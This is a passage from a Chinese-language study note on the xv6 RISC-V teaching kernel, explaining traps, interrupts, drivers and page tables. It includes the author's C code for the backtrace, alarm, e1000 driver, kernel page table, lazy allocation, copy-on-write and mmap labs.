會被 stvec 覆蓋）。 sret: 從 trap 中返回 scause：RISC -V 在這裡放了一個數字，描述了 trap 的原因。 sscratch：內核在這裡放置了一個值，這個值會方便 trap 恢復/儲存用戶上下文。 sstatus: 類似attr，SIE 位控制設備中斷是否被啟用，SPP 位表示 trap 是來自用戶模式還是監督者模式，並控制sret 返回到什麼模式\nRISC-V 硬件對所有的 trap 類型（除定時器中斷外）進行以下操作\n如果該 trap 是設備中斷，且 sstatus SIE 位為 1 通過清除 SIE 來禁用中斷 複製 pc 到 sepc 將當前模式(用戶或監督者)保存在 sstatus 的 SPP 位 在 scause 設置該次 trap 的原因 將模式轉換為監督者 將 stvec 複製到 pc 執行新的 pc CPU 不會切換到內核頁表，不會切換到內核中的棧，也不會保存 pc 以外的任何寄存器!! 內核軟件必須執行這些任務!!\ntrace: trap from user space 從proc的trampoline開始\n跑uservec (kernel mode，因為是中斷) 保存狀態到trapframe trapframe可以 保存所有用户寄存器 指向当前进程的内核栈 当前 CPU 的 hartid usertrap 的地址和内核页表的地址的指针 換kernel pagetable (透過設定satp) 跳usertrap (kernel mode) 設定stvec成kernelvec 保存pc syscall或是device interrupt usertrap完到usertrapret (kernel mode)\n設定成stvec，要到uservec 把kernel資訊寫到trapframe 設定pc (trap的重點!!!) 設定user pagetable 設定user mode 跳到userret (user mode) 把trapframe載回去 return 到原本的位置 trace: exec syscall 用戶代碼將 exec 的參數放在寄存器 a0 和 a1 中，並將系統調用號放在 a7 中 系統調用號與函數指針表 syscalls 數組(kernel/syscall.c:108)中的項匹配 (from trapframe的a7) ecall 指令進入內核，執行uservec、usertrap，然後執行 syscall 當系統調用函數返回時，syscall 將其返回值記錄在 p-\u0026gt;trapframe-\u0026gt;a0 中 如果有pointer? 透過kernel function去load 使用 fetchstr 從用戶空間中檢索字符串文件名參數，fetchstr 調用 copyinstr 來做這些困難的工作\ntrap from kernel space kernel的trap因為在kernel所以不用換pagetable、stvec 同時因為大家都有自己的kstack，所以可以把registrer存在stack上\nkernelvec 保存狀態到kstack 跳到kerneltrap (會回來kernelvec) 保存pc, sstatus, scause pc很正常，但sstatus,scause!? 如果是timer interupt會yield 等回來，會需要原本的sstatus,scause 做該做的事 timer的preemptive切換在這裡實現 回復sstatus,scause之後return 從kstack回復狀態 trap from device 許多設備驅動程序在兩個 context 中執行代碼： 上半部分(top half)在進程的內核線程中運行 下半部分(bottom half)在中斷時執行\n上半部分是通過系統調用，如希望執行 I/O 的read 和 write。 這段代碼可能會要求硬件開始一個操作（比如要求磁盤讀取一個塊）；然後代碼等待操作完成。 最終設備完成操作並引發一個中斷。 驅動程序的中斷處理程序，作為下半部分，推算出什麼操作已經完成，如果合適的話，喚醒一個等待該操作的進程，並告訴硬件執行下一個操作。\ntrace: Console input UART 硬件在軟件看來是一組內存映射的控制寄存器 (不用port操作啦)\n當 UART 接收到一個字節的輸入時，就產生一個接收中斷，當 UART 每次完成發送一個字節的輸出時產生一個傳輸完成(transmit complete)中斷(kernel/uart.c:53)。\ntrap 處理程序調用 devintr(kernel/trap.c:177)，它查看 RISC-V 的 scause 寄存器，發現中斷來自一個外部設備。 然後它向一個叫做 PLIC的硬件單元詢問哪個設備中斷了(kernel/trap.c:186)。 如果是 UART，devintr 調用 uartintr。\nuartintr (kernel/uart.c:180) 從 UART 硬件中讀取在等待的輸入字符，並將它們交給consoleintr (kernel/console.c:138)； 它不會等待輸入字符，因為以後的輸入會引發一個新的中斷。 consoleintr 的工作是將中輸入字符積累 cons.buf 中，直到有一行字符\n一旦被喚醒，consoleread 將會注意到 cons.buf 中的完整行，並將其將其複製到用戶空間，並返回（通過系統調用）到用戶空間。\ntrace: Console output write 系統調用最終會到達 uartputc(kernel/uart.c:87)。 設備驅動維護了一個輸出緩衝區(uart_tx_buf)，uartputc 將每個字符追加到緩衝區調用 uartstart 來啟動設備發送(如果還沒有的話)，然後返回\n每次 UART 發送完成一個字節，它都會產生一個中斷。 uartintr 調用 uartstart，uartintr檢查設備是否真的發送完畢，並將下一個緩衝輸出字符交給設備，每當 UART 發送完一個字節，就會產生一個中斷\nTimer interrupts RISC-V 要求在機器模式下處理定時器中斷，而不是監督者模式。 因此，xv6 對定時器中斷的處理與上面談到的 trap 機製完全分離了。\n所以都在start中設定\n對 CLINT 硬件（core-local interruptor）進行編程，使其每隔一定時間產生一次中斷 設置一個類似於 trapframe 的 scratch 區域，幫助定時器中斷處理程序保存寄存器和 CLINT 寄存器的地址 所以前面trap要保留scratch的內容 將 mtvec 設置為 timervec，啟用定時器中斷 中斷之後由clockintr處理 (tick++) interrupt還是要處理concurent 內核代碼需要注意它可能會被暫停（由於定時器中斷），然後在不同的 CPU 上恢復\n等等，一直發trap? UART 驅動器通過讀取 UART 控制寄存器，一次檢索一個字節的數據 這種模式被稱為編程 I/O，因為軟件在驅動數據移動。\n程序化 I/O 簡單，但速度太慢，無法在高數據速率下使用。\n需要高速移動大量數據的設備通常使用直接內存訪問（DMA） DMA 設備硬件直接將傳入數據寫入 RAM，並從 RAM 中讀取傳出數據\n當設備在不可預知的時間需要關注時，中斷是很有用的，而且不會太頻繁。 但中斷對 CPU的開銷很大。 因此，高速設備，如網絡和磁盤控制器，使用了減少對中斷需求的技巧。\n其中一個技巧是對整批傳入或傳出的請求提出一個單一的中斷。 另一個技巧是讓驅動程序完全禁用中斷，並定期檢查設備是否需要關注。 這種技術稱為輪詢（polling）。 如果設備執行操作的速度非常快，輪詢是有意義的 但如果設備大部分時間處於空閒狀態，則會浪費 CPU 時間 一些驅動程序會根據當前設備的負載情況，在輪詢和中斷之間動態切換\nLab Traps backtrace defs.h加\nvoid backtrace(void); 接著hint有提到sp與fp，所以就直接用吧 但這裡用struct讓code好看一點\n注意到riscv是小頭，所以mem addr小的會被放到struct最前面 這段我是加在printf.c\nstruct stk_frame { void * prev_frame_plus_16; uint64 ret_addr; }; static inline uint64 r_fp() { uint64 x; asm volatile(\u0026#34;mv %0, s0\u0026#34; : \u0026#34;=r\u0026#34; (x) ); return x; } /* riscv是小頭 所以addr越小，在c struct會被往上面放 stack是往下長 (addr-8) 所以寫struct要把下面的往struct的上面放 (stack倒著放) */ void backtrace(void) { struct stk_frame* now = (struct stk_frame*)(r_fp()-16); uint64 start = PGROUNDDOWN(now-\u0026gt;ret_addr); for (struct stk_frame* now = (struct stk_frame*)(r_fp()-16); now-\u0026gt;ret_addr \u0026gt; start; now=now-\u0026gt;prev_frame_plus_16-16) printf(\u0026#34;%p\\n\u0026#34;, now-\u0026gt;ret_addr); } 最後就直接call\nuint64 sys_sleep(void) { int n; uint ticks0; backtrace(); if(argint(0, \u0026amp;n) \u0026lt; 0) return -1; // ... } fp \u0026amp; sp from hint sp就是目前stack的top fp就是保存caller訊息的addr\ncaller reg: caller要存，換言之，在call完function後可能會被破壞掉 callee reg: callee要還原，換言之，在call完function後他們的值還是對的\nalarm 如果timer動了就call一下callback，透過兩個syscall，sigalarm與sigreturn 但要怎麼到callback去，是要在kernel mode跑??\ntimer interupt最後會回到user mode，所以只要讓他不要回到原本的位置就好!! 這手法我們看過了，usertrapret與usertrap與kerneltrap都是透過改pc完成的\n所以我們也改pc到callback，但是執行時的狀態怎麼辦，要怎麼回去原本的狀態? 再多一個trapframe存原本的trapframe，在alarmreturn把原本的frame設回去\nsysproc.c\nuint64 sys_sigreturn(void) { struct proc * p = myproc(); p-\u0026gt;acc = 0; memmove(p-\u0026gt;trapframe, p-\u0026gt;trapframe2, sizeof(struct trapframe)); return 0; } uint64 sys_sigalarm(void) { struct proc* p = myproc(); if(argint(0, \u0026amp;p-\u0026gt;cnt) \u0026lt; 0) return -1; if(argaddr(1, \u0026amp;p-\u0026gt;cb) \u0026lt; 0) return -1; return 0; } trap.c\n// ... if(which_dev == 2) { if (p-\u0026gt;cnt) { if (++p-\u0026gt;acc == p-\u0026gt;cnt) { memmove(p-\u0026gt;trapframe2, p-\u0026gt;trapframe, sizeof(struct trapframe)); p-\u0026gt;trapframe-\u0026gt;epc = p-\u0026gt;cb; } } yield(); } // ... Lab network driver 在2019的版本是要實現stack與driver的，所以很累，但2020就不用實現stack\ndriver driver的重點是怎麼與device溝通\niface都是用ring buffer去存資料\nxx_ring就是device的buffer的狀態，然後他們是array 那是要取哪一個?? write: 取E1000_TDT，這是接下去dirver要寫的位置 read: 取E1000_RDT，這是iface已經讀完的位置\nxx_mbuf是ring buffer對應到的memory\n所以 write: 把tx_ring[regs[E1000_TDT]]的狀態設定好，把addr指向第一個位置 read: 先拉regs[E1000_TDT]+1的mbuf，之後用新的mbuf蓋掉原本的\nint inc(int i, int len) { return (i+1) % len; } int e1000_transmit(struct mbuf *m) { acquire(\u0026amp;e1000_lock); int i = regs[E1000_TDT], ret; if ((tx_ring[i].status \u0026amp; E1000_TXD_STAT_DD) == 0) { printf(\u0026#34;not ready for trasmit\u0026#34;); ret = -1; } else { // free previous mbuf if (tx_mbufs[i]) mbuffree(tx_mbufs[i]); tx_ring[i].addr = (uint64)m-\u0026gt;head; tx_ring[i].length = m-\u0026gt;len; tx_ring[i].cmd = E1000_TXD_CMD_EOP | E1000_TXD_CMD_RS; tx_mbufs[i] = m; regs[E1000_TDT] = inc(i, TX_RING_SIZE); ret = 0; } release(\u0026amp;e1000_lock); return ret; } // allocate mbuf for iface static void e1000_recv(void) { for (int i = inc(regs[E1000_RDT], RX_RING_SIZE);rx_ring[i].status \u0026amp; E1000_RXD_STAT_DD;i = inc(regs[E1000_RDT], RX_RING_SIZE)) { acquire(\u0026amp;e1000_lock); struct mbuf* pkt = *(rx_mbufs+i); mbufput(pkt, rx_ring[i].length); rx_mbufs[i] = mbufalloc(0); // 從哪邊塞 rx_ring[i].addr = (uint64)rx_mbufs[i]-\u0026gt;head; rx_ring[i].status = 0; regs[E1000_RDT] = i; release(\u0026amp;e1000_lock); net_rx(pkt); } } network stack 雖然說不用實現一個network stack，但我們可以trace看看\nrx net_rx 拉eth_header 判斷type決定要去哪 ntohs去轉數字 net_rx_ip 拉ip_header 各種判斷與check cksum routing 這裡只有看是不是給我們，不是就丟了 算udp長度 送去udp net_rx_udp 拉udp_header 各種判斷與check 把sip, sport, dport抓出來，送到sockrecvudp sockrecvudp 找到對的socket 把pkt塞到socket的queue tx sockwrite alloc mbuf copy data 送到net_tx_udp net_tx_udp 把sip, sport, dport轉成network order 設定udp header，並加在mbuf上 送到net_tx_ip net_tx_ip 與net_tx_udp很像，轉資料，加在mbuf上 送到net_tx_eth 不存在的routing 一般來說從ip到eth或是eth到ip之間要過routing 決定要繼續往上還是直接轉出去 以linux的netfilter為例 net_tx_eth 塞ethaddr，加在mbuf上 這裡是直接boardcast，所以迴避了arp call e1000_transmit ch3 來了，最難的部分，撐過去就會有全新的方式看待c了!!\n為什麼會難?\n很難debug，一個是要知道結構，也要只到這個數字對應到什麼，還有concurrent要處理 都是uint64 之後會在va, pte, pa一直轉來轉去 kernel mem layout 当内核通过高地址映射使用 stack 时，它们也可以通过直接映射的地址被内核访问 内核使用“直接映射”RAM 和内存映射设备寄存器，也就是在虚拟地址上映射硬件资源，这些地址与物理地址相等。 例如，内核本身在虚拟地址空间和物理内存中的位置都是KERNBASE=0x80000000。直接映射简化了读/写物理内存的内核代码。 pagetable page table就是把virtual address(va)，丟到table換出physical address(pa) 硬體上是分成3層，也因為多了一層抽象，所以可以多點attr 像後面就是看page有沒有PTE_V(Page Table Entry, PTE)，決定這個page是不是free\n要告訴硬件使用頁表，內核必須將根頁表頁的物理地址寫入 satp 寄存器中\npte, pagetable都是存在pa中!!\n如何map \u0026amp; 如何把va換成pa pagetable就是hashtable，所以要先知道key,value到底要什麼?\nkey: va，在程式中跑的數字；pte，可以換出pagetable或是pa的數字，可以把pte當成page開頭的pa(見walk) value: pa，真實mem的addr\ntrace: free mem怎麼產生的 把kernel的memory layout打開來 中間的free memory就是我們需要的東西\n接著就是怎麼讓free memory可以被分配，要先切塊\nkinit freerange 從end到PHYSTOP跑kfree kfree就是加linked list 如何把va換成pa: walk 就是模擬在table跳的過程，一層一層換pte，到最後就可以用kalloc拿pa，利用pa設定對應的pte 之後回傳對應的pa\n那怎麼從va拿pte? 再看回去這張圖 注意到va最右手邊就是12個offset，之後看到pte的右手邊是10位flag，所以轉成pte就是把12位拿掉再把10位補回去\n#define PA2PTE(pa) ((((uint64)pa) \u0026gt;\u0026gt; 12) \u0026lt;\u0026lt; 10) #define PTE2PA(pte) (((pte) \u0026gt;\u0026gt; 10) \u0026lt;\u0026lt; 12) #define PTE_FLAGS(pte) ((pte) \u0026amp; 0x3FF) 剩下就是walk三層table了\n// extract the three 9-bit page table indices from a virtual address. #define PXMASK 0x1FF // 9 bits #define PXSHIFT(level) (PGSHIFT+(9*(level))) #define PX(level, va) ((((uint64) (va)) \u0026gt;\u0026gt; PXSHIFT(level)) \u0026amp; PXMASK) // Return the address of the PTE in page table pagetable // that corresponds to virtual address va. If alloc!=0, // create any required page-table pages. // // The risc-v Sv39 scheme has three levels of page-table // pages. A page-table page contains 512 64-bit PTEs. // A 64-bit virtual address is split into five fields: // 39..63 -- must be zero. // 30..38 -- 9 bits of level-2 index. // 21..29 -- 9 bits of level-1 index. // 12..20 -- 9 bits of level-0 index. // 0..11 -- 12 bits of byte offset within the page. pte_t * walk(pagetable_t pagetable, uint64 va, int alloc) { if(va \u0026gt;= MAXVA) panic(\u0026#34;walk\u0026#34;); for(int level = 2; level \u0026gt; 0; level--) { pte_t *pte = \u0026amp;pagetable[PX(level, va)]; if(*pte \u0026amp; PTE_V) { pagetable = (pagetable_t)PTE2PA(*pte); } else { if(!alloc || (pagetable = (pde_t*)kalloc()) == 0) return 0; memset(pagetable, 0, PGSIZE); *pte = PA2PTE(pagetable) | PTE_V; } } return \u0026amp;pagetable[PX(0, va)]; } 如何map: mappages mappages就是walk很多次，一次一個page\n如果完成map就可以用c的*做操作!! 十分神奇，前面還是當成數字操作，之後就可以直接dereference\ntrace: 怎麼做mem alloc mem alloc，就是\nkalloc拿一塊page，拿到一個pa mappages在pagetable中設定va到pa trace: 怎麼free mem/pagetable free mem就是\nuvmunmap 會walk拉出pa 檢查有沒有被map過(有PTE_V) 如果有要free，就kfree free pagetable比較麻煩\nuvmfree uvmunmap把所有pa去掉 walkfree把pte去掉 trace: how to create kernel page table kvminit設定kernel_pagetable 跑kvmmake會生出kernel pagetable 先kalloc一塊放pagetable 之後照layout設定 kvminithart 設定satp how to access a page table: pagetable_t，它實際上是一個指向 RISC-V 根頁表頁的指針 (pa) process mem layout 當一個進程要求 xv6 提供更多的用戶內存時，xv6 首先使用 kalloc 來分配物理頁，然後將指向新物理頁的 PTE 添加到進程的頁表中。\nxv6 使用 PTE_V 來清除不使用的 PTE\ntrampoline是負責跳到hypervisor mode的code trapframe是在跳之前保存process狀態的地方\ntrace: sbrk 回傳目前的終點(sz)，之後算與原本size的差，之後調用uvmalloc 或 uvmdealloc縮放自己的大小\ntrace: exec open binary exe (namei) parse ELF 從proc_pagetable分配一個page，之後用uvmalloc為剩下的proc配置page exec配出來的mem layout可以看process mem layout的圖\nBefore labs 在做lab之前先看看要怎麼為某個va做map，會做兩件事\n拿一塊page 把va指(map)過去 這裡的va不一定是剛好在page的起點上!! 記得，所有mem都要以page為單位 故要先介紹兩個macro，因為之後很常用到\nPGROUNDUP: page的終點 usage: exec在alloc elf的執行檔後要alloc stack，就是先取PGROUNDUP，之後stack從PGROUNDUP開始alloc PGROUNDDOWN: page的起點 usage: mappages在一開始就先對傳進來的va做PGROUNDDOWN，之後才開始alloc Lab Page tables vmprint 小試身手，抄freewalk，走過每個pte即可\nvoid vmprint_dfs(pagetable_t pagetable, int dep) { if (*pagetable \u0026lt; MAXVA) for(int i = 0; i \u0026lt; 512; i++){ pte_t pte = pagetable[i]; if((pte \u0026amp; PTE_V) \u0026amp;\u0026amp; pte \u0026lt; MAXVA){ uint64 child = PTE2PA(pte); for (int j=0;j\u0026lt;dep;j++) printf(\u0026#34;.. \u0026#34;); printf(\u0026#34;..%d: ptr %p pa %p\\n\u0026#34;, i, pte, child); vmprint_dfs((pagetable_t)child, dep+1); } } } void vmprint(pagetable_t pagetable) { printf(\u0026#34;page table %p\\n\u0026#34;, pagetable); vmprint_dfs(pagetable, 0); } new copyin, copyinstr 現在想把user mode的資料加到kernel mode的表，這樣就不用copy來copy去\n先要有產生kernel pagetable的函數，並在struct proc中多加一個kernel pagetable\nvoid kpgtinit(pagetable_t t) { memset(t, 0, PGSIZE); // uart registers if (mappages(t, UART0, PGSIZE, UART0, PTE_R | PTE_W) \u0026lt; 0) panic(\u0026#34;kpgtinit: uart0\\n\u0026#34;); // virtio mmio disk interface if (mappages(t, VIRTIO0, PGSIZE, VIRTIO0, PTE_R | PTE_W) \u0026lt; 0) panic(\u0026#34;kpgtinit: virtio0\\n\u0026#34;); // CLINT if (mappages(t, CLINT, 0x10000, CLINT, PTE_R | PTE_W) \u0026lt; 0) panic(\u0026#34;kpgtinit: clint\\n\u0026#34;); // PLIC if (mappages(t, PLIC, 0x400000, PLIC, PTE_R | PTE_W) \u0026lt; 0) panic(\u0026#34;kpgtinit: plic\\n\u0026#34;); // map kernel text executable and read-only. if (mappages(t, KERNBASE, (uint64)etext-KERNBASE, KERNBASE, PTE_R | PTE_X) \u0026lt; 0) panic(\u0026#34;kpgtinit: kernel base\\n\u0026#34;); // map kernel data and the physical RAM we\u0026#39;ll make use of. if (mappages(t, (uint64)etext, PHYSTOP-(uint64)etext, (uint64)etext, PTE_R | PTE_W) \u0026lt; 0) panic(\u0026#34;kpgtinit: kernel data\\n\u0026#34;); // map the trampoline for trap entry/exit to // the highest virtual address in the kernel. if (mappages(t, TRAMPOLINE, PGSIZE, (uint64)trampoline, PTE_R | PTE_X) \u0026lt; 0) panic(\u0026#34;kpgtinit: trampoline\\n\u0026#34;); } void switchPGT(pagetable_t t) { w_satp(MAKE_SATP(t)); sfence_vma(); } 因為每個process都有kernel table，所以可以把kstack分到每個kernel pagetable去，把procinit的kstack拿掉\nstatic struct proc* allocproc(void) { // ... p-\u0026gt;kpagetable = (pagetable_t) kalloc(); kpgtinit(p-\u0026gt;kpagetable); char *pa = kalloc(); if(pa == 0) panic(\u0026#34;kalloc\u0026#34;); uint64 va = KSTACK(0); mappages(p-\u0026gt;kpagetable, va, PGSIZE, (uint64)pa, PTE_R | PTE_W); p-\u0026gt;kstack = va; // ... } 所以現在每個process都有一個kernel pagetable，需要的時候會把user mode pagetable的map到在kernel pagetable也map一下\nvoid includeInto(pagetable_t pagetable, pagetable_t kpagetable, uint64 oldsz, uint64 newsz) { pte_t *pte_from, *pte_to; uint64 a, pa; uint flags; if (newsz \u0026lt; oldsz) return; oldsz = PGROUNDUP(oldsz); for (a = oldsz; a \u0026lt; newsz; a += PGSIZE) { if ((pte_from = walk(pagetable, a, 0)) == 0) panic(\u0026#34;includeInto: pte should exist\u0026#34;); if ((pte_to = walk(kpagetable, a, 1)) == 0) panic(\u0026#34;includeInto: walk fails\u0026#34;); pa = PTE2PA(*pte_from); flags = (PTE_FLAGS(*pte_from) \u0026amp; (~PTE_U)); *pte_to = PA2PTE(pa) | flags; } } 需要的時候? 就是程式在kernel mode中時動到或是需要user mode的資料時\nuserinit growproc 這裡要看kernel的layout，PILC上面的其實不能用，因為已經被map了 fork exec void userinit(void) { // ... includeInto(p-\u0026gt;pagetable, p-\u0026gt;kpagetable, 0, p-\u0026gt;sz); // prepare for the very first \u0026#34;return\u0026#34; from kernel to user. p-\u0026gt;trapframe-\u0026gt;epc = 0; // user program counter // ... } // Grow or shrink user memory by n bytes. // Return 0 on success, -1 on failure. int growproc(int n) { // ... if(n \u0026gt; 0){ if (PGROUNDUP(sz + n) \u0026gt;= PLIC) return -1; // ... includeInto(p-\u0026gt;pagetable, p-\u0026gt;kpagetable, sz-n, sz); } else if(n \u0026lt; 0){ sz = uvmdealloc(p-\u0026gt;pagetable, sz, sz + n); } p-\u0026gt;sz = sz; return 0; } // Create a new process, copying the parent. // Sets up child kernel stack to return as if from fork() system call. int fork(void) { // ... includeInto(np-\u0026gt;pagetable, np-\u0026gt;kpagetable, 0, np-\u0026gt;sz); safestrcpy(np-\u0026gt;name, p-\u0026gt;name, sizeof(p-\u0026gt;name)); pid = np-\u0026gt;pid; np-\u0026gt;state = RUNNABLE; release(\u0026amp;np-\u0026gt;lock); return pid; } freeproc也把kernel pagetable也free掉，但是不能把kernel的項目的pa給free掉\nvoid freewalk_keepleaf(pagetable_t pagetable) { // there are 2^9 = 512 PTEs in a page table. for(int i = 0; i \u0026lt; 512; i++){ pte_t pte = pagetable[i]; if((pte \u0026amp; PTE_V)) { pagetable[i] = 0; if((pte \u0026amp; (PTE_R|PTE_W|PTE_X)) == 0){ // this PTE points to a lower-level page table. uint64 child = PTE2PA(pte); freewalk_keepleaf((pagetable_t)child); } } } kfree((void*)pagetable); } void proc_freekpt(pagetable_t pagetable) { // there are 2^9 = 512 PTEs in a page table. for(int i = 0; i \u0026lt; 512; i++){ pte_t pte = pagetable[i]; if((pte \u0026amp; PTE_V)){ pagetable[i] = 0; if ((pte \u0026amp; (PTE_R|PTE_W|PTE_X)) == 0) { uint64 child = PTE2PA(pte); proc_freekpt((pagetable_t)child); } } else if(pte \u0026amp; PTE_V){ panic(\u0026#34;proc free kpt: leaf\u0026#34;); } } kfree((void*)pagetable); } static void freeproc(struct proc *p) { // ... if(p-\u0026gt;pagetable) proc_freepagetable(p-\u0026gt;pagetable, p-\u0026gt;sz); if (p-\u0026gt;kstack) { uvmunmap(p-\u0026gt;kpagetable, p-\u0026gt;kstack, 1,1); p-\u0026gt;kstack = 0; } if(p-\u0026gt;kpagetable) freewalk_keepleaf(p-\u0026gt;kpagetable); p-\u0026gt;kpagetable = 0; // ... } 最後就可以切到新的copyin, copyinstr了\nLab Lazy allocation 在sbrk不分配mem\nuint64 sys_sbrk(void) { int addr; int n; if(argint(0, \u0026amp;n) \u0026lt; 0) return -1; addr = myproc()-\u0026gt;sz; if(n \u0026lt; 0) growproc(n); else myproc()-\u0026gt;sz += n; return addr; // !!! } 在page fault時做分配\nint do_lazy(uint64 addr) { struct proc* p = myproc(); int stkOverFlow = (addr \u0026lt; p-\u0026gt;trapframe-\u0026gt;sp); // page-faults on a virtual memory address higher than any allocated with sbrk() // this should be \u0026gt;= not \u0026gt; !!! int addrOutOfBound = (addr \u0026gt;= p-\u0026gt;sz); void *mem; if (stkOverFlow) ;//printf(\u0026#34;lazy: stack overflow\\n\u0026#34;); else if(addrOutOfBound) ;//printf(\u0026#34;lazy: addr over of bound\\n\u0026#34;); else if((mem = kalloc()) == 0) ;//printf(\u0026#34;out of pa\\n\u0026#34;); else { memset(mem, 0, PGSIZE); if (mappages(p-\u0026gt;pagetable, PGROUNDDOWN(addr), PGSIZE, (uint64)mem, PTE_W|PTE_X|PTE_R|PTE_U) \u0026lt; 0)// ??? kfree(mem); else return 0; } return -1; } void usertrap(void) { // ... if(r_scause() == 8){ // ... intr_on(); syscall(); } else if(r_scause() == 13 || r_scause() == 15) { if (do_lazy(r_stval()) \u0026lt; 0) p-\u0026gt;killed = 1; } else if((which_dev = devintr()) != 0){ // ok } // ... } 剩下要在走訪pte時忽略沒有PTE_V的page，這邊就看hint就知道要改哪\nLab Copy on-write 這裡會牽涉到reference counter，導致要處理concurrent!! 如果沒有處理好，連怎麼出事的都不知道\n先refcnt，代表有多少process有map到這個page\nstruct __refcnt{ struct spinlock lock; uint counter[(PHYSTOP - KERNBASE) / PGSIZE]; }; struct __refcnt refcnt; void refcnt_lock() { acquire(\u0026amp;refcnt.lock); } void refcnt_unlock() { release(\u0026amp;refcnt.lock); } void refcnt_create() { initlock(\u0026amp;refcnt.lock, \u0026#34;refcnt\u0026#34;); refcnt_lock(); for(int i=0,goal=(PHYSTOP - KERNBASE) / PGSIZE;i\u0026lt;goal;i++) refcnt.counter[i] = 0; refcnt_unlock(); } inline uint64 refcnt_index(uint64 pa){ return (pa - KERNBASE) / PGSIZE; } void refcnt_set(uint64 pa, int n) { refcnt.counter[refcnt_index(pa)] = n; } inline uint refcnt_get(uint64 pa){ return refcnt.counter[refcnt_index(pa)]; } void refcnt_incr(uint64 pa){ refcnt.counter[refcnt_index(pa)]++; } void refcnt_desc(uint64 pa){ if (refcnt.counter[refcnt_index(pa)] \u0026gt; 0) refcnt.counter[refcnt_index(pa)]--; else panic(\u0026#34;wtf\u0026#34;); } 之後page要會fork 兩個case\nrefcnt大於1: 產生新的page，原本的page的refcnt減1 refcnt等於1: 直接拿去用 int page_fork(uint64 va) { int ret; pagetable_t pgt = myproc()-\u0026gt;pagetable; va = PGROUNDDOWN(va); pte_t * pte = walk(pgt, va, 0); uint64 pa = PTE2PA(*pte); uint flags = PTE_FLAGS(*pte); if ((*pte) \u0026amp; PTE_COW) { refcnt_lock(); // MUST BE DONE TOGETHER!! if (refcnt_get(pa) \u0026gt; 1) { void *mem = kalloc_cow(); if (mem != 0) { memmove(mem, (char*)pa, PGSIZE); if(mappages(pgt, va, PGSIZE, (uint64)mem, (flags \u0026amp; (~PTE_COW)) | PTE_W) != 0) ret = -1, kfree(mem); else ret = 0, refcnt_desc(pa); } else ret = -3; } else ret = 0, *pte = (*pte \u0026amp; ~PTE_COW) | PTE_W; refcnt_unlock(); } else ret = -2; return ret; } 與之相對，kfree只有在refcnt小於等於1時才free，其他都是decrease refcnt\nvoid kfree(void *pa) { struct run *r; refcnt_lock(); //premise: counter == 0 \u0026lt;=\u0026gt; this page is in freelist if (refcnt_get((uint64)pa) \u0026lt;= 1) { if(((uint64)pa % PGSIZE) != 0 || (char*)pa \u0026lt; end || (uint64)pa \u0026gt;= PHYSTOP) panic(\u0026#34;kfree\u0026#34;); // Fill with junk to catch dangling refs. memset(pa, 1, PGSIZE); refcnt_set((uint64)pa, 0); r = (struct run*)pa; acquire(\u0026amp;kmem.lock); r-\u0026gt;next = kmem.freelist; kmem.freelist = r; release(\u0026amp;kmem.lock); } else refcnt_desc((uint64)pa); refcnt_unlock(); } 另外，從kernel mode複製到user mode也要fork page 如果都指向同一個page要分開\nint uvmcopy(pagetable_t old, pagetable_t new, uint64 sz) { // 從copy變成map // ... for(i = 0; i \u0026lt; sz; i += PGSIZE){ // ... *pte = ((*pte) \u0026amp; (~PTE_W)) | PTE_COW; if(mappages(new, i, PGSIZE, (uint64)pa, (flags \u0026amp; (~PTE_W)) | PTE_COW) != 0) goto err; else { refcnt_lock(); refcnt_incr(pa); refcnt_unlock(); } } return 0; err: uvmunmap(new, 0, i / PGSIZE, 1); return -1; } int copyout(pagetable_t pagetable, uint64 dstva, char *src, uint64 len) { uint64 n, va0, pa0; while(len \u0026gt; 0){ // ... // 如果都指向同一個page要分開 pte_t* pte = walk(pagetable, va0, 0); if (pte \u0026amp;\u0026amp; (*pte \u0026amp; PTE_COW)) if (page_fork(va0) != 0) return -1; // ... } } 之後把剩下的線串完\nvoid usertrap(void) { // ... } else if((r_scause() == 15)) { if (page_fork(r_stval())) p-\u0026gt;killed = 1; } else { // ... } 這邊有一個要注意的點 refcnt是跟著page走，所以直到page與refcnt設定好之前任何人都不該動refcnt 這導致kalloc與kalloc_cow的產生，因為refcnt會鎖，但是做page_fork時會動到兩個page，所以kalloc_cow不鎖，交給page_fork鎖\nvoid * kalloc(void) { // ... if(r) { refcnt_lock(); refcnt_incr((uint64)r); refcnt_unlock(); //printf(\u0026#34;init: %p %d\\n\u0026#34;, r, refcnt_get((uint64)r)); memset((char*)r, 5, PGSIZE); // fill with junk } return (void*)r; } void * kalloc_cow(void) { // ... if(r) { refcnt_set((uint64)r, 1); //printf(\u0026#34;init: %p %d\\n\u0026#34;, r, refcnt_get((uint64)r)); memset((char*)r, 5, PGSIZE); // fill with junk } return (void*)r; } 最後就像，lazy alloc做的一樣，要處理走訪pte時忽略沒有PTE_V的page\nlock心得 0. 上鎖\n先存狀態 都用同一個狀態延伸 把所有動作用同一個鎖包 (這會導致在不同branch要一直release) 確保假設被打破時可以馬上停下程式 (ex: panic(\u0026ldquo;wtf\u0026rdquo;)) Lab mmap 現在user可以自己設定自己的addr了!!\nQ: 這樣怎麼區分user設定的資料與程式設定的(原本活在pagetable中的)資料? A: 多一個vma去trace\nQ: 怎麼分配位置? A: 這隨便，這裡從TRAPFRAME之後開始\nQ: 如果alloc很多塊，卻只free其中幾塊，我們還有方法再利用那些mem嗎? A: 這要做compact，但我懶，沒做test會過\n先加vma，與sbrk很像，用vma_end紀錄最後的位置 記住，riscv是往addr小的地方開始填資料\nstruct entry { uint64 va_end; int size; int prot; int flag; struct file* f; }; #define VMA_SIZE 16 #define VMA_BASE (TRAPFRAME - PGSIZE) struct proc { // ... struct entry vma[VMA_SIZE]; uint64 vma_end; }; 之後要可以alloc vma，與get vma\nstruct entry* allocvma() { struct proc *p = myproc(); struct entry* ret = 0; for (int i = 0;i\u0026lt;VMA_SIZE;i++) { if (p-\u0026gt;vma[i].size == 0) { ret = \u0026amp;(p-\u0026gt;vma[i]); break; } } return ret; } struct entry* getvma(uint64 addr) { int i; struct proc *p = myproc(); for (i = 0;i\u0026lt;VMA_SIZE;i++) if (p-\u0026gt;vma[i].size \u0026gt; 0 \u0026amp;\u0026amp; p-\u0026gt;vma[i].va_end \u0026gt; addr \u0026amp;\u0026amp; addr \u0026gt;= p-\u0026gt;vma[i].va_end-p-\u0026gt;vma[i].size) break; return i \u0026lt; VMA_SIZE ? \u0026amp;(p-\u0026gt;vma[i]) : 0; } 把mmap, munmap加進去 這裡做lazy，只有在read/write才map與讀檔案\nuint64 sys_mmap(void) { struct file* f; uint64 ret = -1; int size, prot, flags, fd; struct proc *p = myproc(); int goodargs = (argint(1, \u0026amp;size) \u0026lt; 0 || argint(2, \u0026amp;prot) 